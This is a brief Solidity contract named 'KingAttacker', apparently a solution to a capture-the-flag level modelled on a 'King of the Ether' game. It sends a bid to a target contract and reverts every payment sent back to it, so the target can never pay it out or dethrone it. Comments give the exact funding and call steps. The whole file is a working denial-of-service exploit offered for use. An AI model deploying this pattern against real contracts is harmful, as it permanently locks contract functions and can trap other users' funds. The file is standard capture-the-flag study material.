contract KingAttacker{
    function attack(address _target, uint256 bid){
        _target.call.value(bid);
    }
    function() payable{
        revert();
    }
}
// Send 1000000000000000001 wei to the contract
// Call KingAttacker.attack("Contract Address", 1000000000000000002)